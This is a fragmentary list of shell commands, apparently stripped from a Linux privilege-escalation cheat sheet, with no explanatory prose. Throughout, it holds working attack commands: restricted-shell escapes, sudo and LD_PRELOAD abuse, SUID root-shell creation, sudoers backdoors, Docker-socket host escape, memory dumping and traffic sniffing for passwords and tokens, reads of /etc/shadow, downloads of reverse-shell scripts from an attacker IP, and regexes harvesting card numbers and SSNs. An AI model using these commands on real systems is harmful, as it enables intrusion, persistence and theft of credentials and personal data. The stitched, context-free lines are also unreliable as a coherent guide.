+cat > /tmp/perllib/HT.pm <<'EOF' package HT; BEGIN { print "PERL5OPT_TRIGGERED\n" } 1; EOF
+PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
+cat > /tmp/preload.js <<'EOF' console.error('[+] NODE_OPTIONS preload reached') EOF
+NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
+mkdir -p /tmp/rubylib
+printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
+RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
+PAGER='sh -c "exec sh 0<&1 1>&1"' man man
+cat > /tmp/lesspipe.sh <<'EOF'
+chmod +x /tmp/lesspipe.sh
+LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
+GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' git -p help
+(cat /proc/version || uname -a ) 2>/dev/null
+lsb_release -a 2>/dev/null
+echo $PATH
+(env || set) 2>/dev/null
+cat /proc/version
+uname -a
+searchsploit "Linux Kernel"
+curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
+echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
+searchsploit sudo
+sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
+sudo -h devbox id
+sudo -h devbox -i
+dmesg 2>/dev/null | grep "signature"
+date 2>/dev/null
+(df -h || lsblk)
+lscpu
+lpstat -a 2>/dev/null
+if [ `which aa-status 2>/dev/null` ]; then
+elif [ `which apparmor_status 2>/dev/null` ]; then
+apparmor_status
+elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
+ls -d /etc/apparmor*
+echo "Not found AppArmor"
+((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
+(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
+(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
+(sestatus 2>/dev/null || echo "Not found sestatus")
+cat /proc/sys/kernel/randomize_va_space 2>/dev/null
+ls /dev 2>/dev/null | grep -i "sd"
+cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
+grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
+which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
+(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
+dpkg -l
+rpm -qa
+ps aux
+top -n 1
+ps -eo pid,ppid,user,comm,args --sort=ppid
+pstree -alp
+pid=1234
+ls -l /proc/$pid/exe
+readlink /proc/$pid/exe
+tr '\0' ' ' </proc/$pid/cmdline; echo
+lsof +L1
+ls -l /proc/1234/fd
+cat /proc/1234/fd/3
+strings /tmp/mem_ftp
+procdump()
+cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
+while read a b; do
+dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
+cat $1*.bin > $1.dump
+rm $1*.bin
+ps -ef | grep "authenticator"
+root 2027 2025 0 11:46 ? 00:00:00 authenticator
+./dump-memory.sh 2027
+strings *.dump | grep -i password
+./truffleproc.sh $$
+Reading symbols from /usr/lib/systemd/systemd...
+Reading symbols from /lib/systemd/libsystemd-shared-247.so...
+Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
+ssh -L 9001:localhost:8000 user@target
+cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
+/tmp/rootshell -p
+crontab -l
+ls -al /etc/cron* /etc/at*
+cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+run-parts --test /etc/cron.hourly
+run-parts --test /etc/cron.daily
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+/tmp/bash -p
+rsync -a *.sh rsync://host.back/src/rbd
+while IFS=',' read -r ts user count rest; do
+(( total += count ))
+$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
+ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
+readlink -f /path/to/link
+namei -l /path/to/link
+openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
+gcc -fPIC -pie monitor.c -o monitor
+objcopy --add-section .text_sig=cert.pem monitor
+objcopy --dump-section .text_sig=text_sig_section.bin monitor
+strings text_sig_section.bin | grep 'Era Inc.'
+cp monitor /opt/AV/periodic-checks/monitor
+chmod 770 /opt/AV/periodic-checks/monitor
+for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
+cd /var/lib/postgresql/14/main
+chmod 6777 bash
+ls -l /opt/backups/current/bash
+/opt/backups/current/bash -p
+cat -A /etc/crontab
+cat -A /etc/cron.d/*
+sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
+xxd /etc/crontab | head
+systemctl show-environment
+systemctl list-timers --all
+Unit=backdoor.service
+sudo systemctl enable backu2.timer
+Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
+systemctl cat vuln.socket
+cat >/etc/systemd/system/vuln.service <<'EOF' [Service] Type=oneshot ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash' EOF
+nc -q0 127.0.0.1 9999
+/var/tmp/rootbash -p
+netstat -a -p --unix
+nc -U /tmp/socket
+nc -uU /tmp/socket
+socat - UNIX-CLIENT:/dev/socket
+curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
+docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+curl --unix-socket /var/run/docker.sock http://localhost/images/json
+HELPER=helper
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' "http://localhost/v1.47/containers/create?name=${HELPER}"
+curl --unix-socket /var/run/docker.sock -X POST "http://localhost/v1.47/containers/${HELPER}/start"
+EXEC_ID=$(
+curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' "http://localhost/v1.47/containers/${HELPER}/exec" | tr -d '\n' | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Detach":false,"Tty":true}' "http://localhost/v1.47/exec/${EXEC_ID}/start"
+cat /etc/hostname /etc/hosts /etc/resolv.conf
+dnsdomainname
+grep -E '^(hosts|networks):' /etc/nsswitch.conf
+getent hosts localhost
+cat /etc/inetd.conf /etc/xinetd.conf
+cat /etc/networks
+(ifconfig || ip a)
+(ip -br addr || ip addr show)
+ip -6 route
+ip rule
+ip route get 1.1.1.1
+(arp -e || arp -a || ip neigh)
+(arp -e || arp -a)
+(route || ip n)
+ip -d link
+bridge link 2>/dev/null
+ip netns list 2>/dev/null
+ls /var/run/netns/ 2>/dev/null
+nsenter --net=/proc/1/ns/net ip a 2>/dev/null
+(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)
+sudo nft list ruleset 2>/dev/null
+sudo nft list ruleset -a 2>/dev/null
+sudo ufw status verbose 2>/dev/null
+sudo firewall-cmd --state 2>/dev/null
+sudo firewall-cmd --list-all 2>/dev/null
+sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
+sudo conntrack -L 2>/dev/null | head -n 20
+lsof -i
+dig +time=2 +tries=1 @1.1.1.1 google.com A
+dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A
+for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done
+sudo traceroute -T -p 443 example.org 2>/dev/null || true
+env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
+curl --socks5-hostname 10.10.14.14:1080 https://ifconfig.me
+(netstat -punta || ss --ntpu)
+(netstat -punta || ss --ntpu) | grep "127.0"
+ss -tulpn
+ss -tulpn | awk '{print $5}' | sort -u
+ss -tulnp
+nmap -Pn --open -p- 127.0.0.1
+nmap -Pn -sV -p 4444 127.0.0.1
+nc 127.0.0.1 4444
+printf 'HELP\r\n' | nc 127.0.0.1 4444
+./linpeas.sh -t
+./linpeas.sh -d 10.10.10.0/24
+./linpeas.sh -d 10.10.10.0/24 -p 22,80,443
+./linpeas.sh -i 10.10.10.20
+./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
+which dumpcap && getcap "$(which dumpcap)"
+tcpdump -D
+ip -br addr
+sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
+sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
+tshark -r /tmp/capture.pcap -Y http.request -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
+id || (whoami && groups) 2>/dev/null
+cat /etc/passwd | cut -d: -f1
+cat /etc/passwd | grep "sh$"
+awk -F: '($3 == "0") {print}' /etc/passwd
+users
+last | tail
+lastlog2 2>/dev/null || lastlog
+for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
+gpg --list-keys 2>/dev/null
+if [ `which xclip 2>/dev/null` ]; then
+echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
+echo "Highlighted text: "`xclip -o 2>/dev/null`
+elif [ `which xsel 2>/dev/null` ]; then
+echo "Clipboard: "`xsel -ob 2>/dev/null`
+echo "Highlighted text: "`xsel -o 2>/dev/null`
+grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
+find / -perm -4000 2>/dev/null
+sudo awk 'BEGIN {system("/bin/sh")}'
+sudo find /etc -exec sh -i \;
+sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
+sudo tar c a.tar -I ./runme.sh a
+ftp>!/bin/sh
+less>! id
+User waldo may run the following commands on admirer:
+(ALL) SETENV: /opt/scripts/admin_tasks.sh
+sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
+find / -type d -name __pycache__ -writable 2>/dev/null
+find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
+grep -R "^import \\|^from " /opt/target/ 2>/dev/null
+python3 - <<'PY' import importlib.util spec = importlib.util.find_spec("target_module") print(spec.origin) print(spec.cached) PY
+cat > /dev/shm/shell.sh <<'EOF'
+chmod +x /dev/shm/shell.sh
+BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo
+cat >/dev/shm/terraform-provider-examples <<'EOF'
+chmod +x /dev/shm/terraform-provider-examples
+sudo /usr/bin/terraform -chdir=/opt/examples apply
+mkdir -p /dev/shm/root/examples
+ln -s /root/root.txt /dev/shm/root/examples/flag
+TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
+cat /home/$USER/docker/previous/public/examples/flag
+Defaults !requiretty
+cat > ~/bin/free <<'EOF'
+chmod +x ~/bin/free
+sudo /usr/local/bin/system_status.sh
+bash -p
+sudo less /var/logs/anything
+less>:e /etc/shadow
+ln /etc/shadow /var/log/new
+sudo less /var/log/new
+sudo less /var/log/../../etc/shadow
+sudo less /var/log/something /etc/shadow
+sudo less
+export -f /usr/sbin/service
+echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
+/usr/local/bin/backup_wrap
+strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
+ls -l /usr/local/bin/backup.sh
+gcc -fPIC -shared -o pe.so pe.c -nostartfiles
+sudo LD_PRELOAD=./pe.so id
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+sudo LD_LIBRARY_PATH=/tmp id
+gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
+ldd some_suid
+something.so => /lib/x86_64-linux-gnu/something.so
+readelf -d payroll | grep PATH
+0x000000000000001d (RUNPATH) Library runpath: [/development]
+./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
+bash exploit.sh
+/tmp/activate_sudo_token
+sudo su
+bash exploit_v2.sh
+/tmp/sh -p
+bash exploit_v3.sh
+./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
+ls -l /etc/sudoers /etc/sudoers.d/
+ls -ld /etc/sudoers.d/
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
+echo "Defaults !tty_tickets" > /etc/sudoers.d/win
+echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
+doas vim
+cat >/tmp/sudo <<EOF
+chmod +x /tmp/sudo
+echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv
+sudo ls
+setfacl -m u:kali:rw file.txt
+setfacl -b file.txt
+getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
+ls -l /etc/sudoers.d/*
+getfacl /etc/sudoers.d//tmp/f
+echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d//tmp/f
+visudo -cf /etc/sudoers.d//tmp/f
+screen -ls
+screen -ls user/
+ls /run/screen/ /var/run/screen/ 2>/dev/null
+screen -dr 3350.foo
+screen -x [user]/[session id]
+tmux ls
+ps aux | grep tmux
+tmux -S /tmp/dev_sess ls
+tmux attach -t myname
+tmux attach -d -t myname
+ls -la /tmp/dev_sess
+rw-rw---- 1 root devs 0 Sep 1 06:27 /tmp/dev_sess
+tmux -S /tmp/dev_sess attach -t 0
+AuthorizedKeysFile .ssh/authorized_keys access
+ls -l /etc/profile /etc/profile.d/
+cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
+cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
+grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
+find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq
+for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done
+ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
+find /home -user root 2>/dev/null
+for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
+find / -type f -user root ! -perm -o=r 2>/dev/null
+find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
+find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
+find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
+find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
+find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
+find / -type f -iname ".*" -ls 2>/dev/null
+for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
+for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
+ls -alhR /var/www/ 2>/dev/null
+ls -alhR /srv/www/htdocs/ 2>/dev/null
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/ 2>/dev/null
+find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
+aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
+grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
+~/.bash_profile
+~/.bash_login
+~/.profile
+/etc/profile
+~/.bashrc
+~/.bash_logout
+~/.zlogin
+~/.zshrc
+NAME=Network /bin/id
+ONBOOT=yes
+DEVICE=eth0
+base64 -w 0 file
+xxd -p boot12.bin | tr -d '\n'
+curl https://10.10.14.14/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+echo -n -e
+wc -l /tmp/f
+wc -c
+sort -nr
+cat file | sort | uniq
+sed -i 's/OLD/NEW/g' path/file
+wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
+wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
+curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
+lsof
+lsof -p 3
+lsof -i 4
+lsof -i 6
+lsof -i 4 -a -p 1234
+lsof +D /lib
+lsof -i :80
+fuser -nv tcp 80
+readlink /proc/1234/fd/3
+find /proc/[0-9]*/fd -lname '*deleted*' 2>/dev/null
+tar -xvzf /path/to/yourfile.tgz
+tar -xvjf /path/to/yourfile.tbz
+bzip2 -d /path/to/yourfile.bz2
+tar jxf file.tar.bz2
+gunzip /path/to/yourfile.gz
+unzip file.zip
+7z -x file.7z
+sudo apt-get install xz-utils; unxz file.xz
+useradd -p 'openssl passwd -1 Passw0rd' hacker
+xclip -sel c < cat file.txt
+python -m SimpleHTTPServer 80
+python3 -m http.server
+php -S $ip:80
+curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
+sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf
+dd if=file.bin bs=28 skip=1 of=blob
+sudo apt-get install libguestfs-tools
+guestmount --add NAME.vhd --inspector --ro /mnt/vhd
+ssh-keyscan 10.10.10.101
+openssl s_client -connect 10.10.10.127:443
+openssl x509 -in ca.cert.pem -text
+openssl genrsa -out newuser.key 2048
+openssl req -new -key newuser.key -out newuser.csr
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256
+openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem
+openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
+openssl rsa -in key.ssh.enc -out key.ssh
+openssl enc -aes256 -k AAAA -d -in backup.tgz.enc -out b.tgz
+perf stat -x, -e instructions:u "ls"
+find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null
+sudo dpkg-reconfigure tzdata
+apt-file search /usr/bin/file
+echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw
+sudo chattr +i file.txt
+sudo chattr -i file.txt
+7z l file.zip
+upx -9 nc.exe
+wine exe2bat.exe nc.exe nc.txt
+pip install pyinstaller
+wget -O exploit.py http://www.exploit-db.com/download/31853
+python pyinstaller.py --onefile exploit.py
+i686-mingw32msvc-gcc -o executable useradd.c
+grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
+grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt
+grep -i "pwd\|passw" file.txt
+grep -i "user\|invalid\|authentication\|login" file.txt
+egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
+grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
+grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
+egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
+egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
+egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
+egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
+egrep -o '$S$S{52}' *.txt > drupal-7.txt
+egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
+egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
+egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt
+grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt
+grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
+grep -E '(((https|ftp|gopher)|mailto)[.:][^ >" ]*|www.[-a-z0-9.]+)[^ .,; >">):]' *.txt > urls.txt
+grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt
+grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
+grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
+grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
+grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
+grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
+grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
+grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt
+grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
+grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
+grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
+grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
+grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
+egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
+find / -perm /u=s -ls 2>/dev/null
+find / -perm /g=s -ls 2>/dev/null
+find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot" | grep -v "| /sys/" | sort -n -r
+find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot" | grep -v "| /sys/" | sort -n -r
+find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot" | grep -v "| /sys/" | sort -n -r
+find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot" | grep -v "| /sys/" | sort -n -r
+find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot" | grep -v "| /sys/" | sort -n -r | less
+find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot" | grep -v "| /sys/" | sort -n -r | less
+find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot" | grep -v "| /sys/" | sort -n -r | less
+nmap --script-help "(default or version) and *smb*"
+locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
+nmap --script-help "(default or version) and smb)"
+for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
+iptables --flush
+iptables --delete-chain
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A OUTPUT -o lo -j ACCEPT
+iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
+iptables -A OUTPUT -p icmp -j DROP
+iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
+iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
+iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
+iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
+iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
+iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT
+iptables -P INPUT DROP
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+sudo bpftool prog
+sudo bpftool prog dump xlated id 835 | less
+sudo bpftool map show id 104
+sudo bpftool map dump id 104 | hexdump -C
+sudo bpftool feature probe | less
+sudo ebpfmon
+journalctl --list-boots
+journalctl -b -1 -p err -o short-iso
+journalctl -u nginx.service --since="2025-06-01 01:00" --until="2025-06-01 02:00"
+journalctl -u ssh.service -f | grep "Failed password"
+journalctl _UID=0 --output=json-pretty --since "1 hour ago"
+journalctl --disk-usage
+sudo journalctl --vacuum-size=1G --vacuum-time=7days
+journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
+echo $0
+echo $SHELL
+export
+set -o
+compgen -c | sort -u
+enable -a
+type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
+PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
+echo /home/*
+less /etc/hosts
+!/bin/sh
+man man
+man '-H/bin/sh #' man
+PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
+awk 'BEGIN {system("/bin/sh")}'
+find . -exec /bin/sh \; -quit
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
+script /dev/null -c bash
+ssh localhost /bin/sh
+red /bin/bash
+w wx/path
+ssh -t user@10.10.14.14 bash
+ssh user@10.10.14.14 -t "/bin/sh"
+ssh user@10.10.14.14 -t "() { :; }; sh -i "
+ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
+ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
+declare -n PATH; export PATH=/bin;bash -i
+BASH_CMDS[shell]=/bin/bash;shell -i
